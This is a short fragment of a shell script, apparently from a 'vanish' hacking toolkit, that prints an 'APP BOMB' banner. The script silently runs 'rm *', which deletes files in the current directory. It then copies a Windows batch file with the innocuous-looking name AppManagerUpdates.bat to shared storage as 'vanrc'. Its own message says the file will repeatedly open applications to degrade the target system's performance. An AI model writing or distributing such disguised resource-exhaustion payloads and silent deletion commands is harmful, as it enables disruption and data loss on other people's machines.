...
rm * >/dev/null 2>&1
cd $HOME
cp $HOME/vanish/core/src/windows/AppManagerUpdates.bat /sdcard/vanrc >/dev/null 2>&1
clear
echo -e "\e[91m   
            ┌─┐┌─┐┌─┐  ┌┐ ┌─┐┌┬┐┌┐ 
            ├─┤├─┘├─┘  ├┴┐│ ││││├┴┐
...
"
echo
echo -e "  \e[91m[\e[0mIt will open different applications repeatedly
    which will affect the system’s performance.\e[91m]\e[0m"
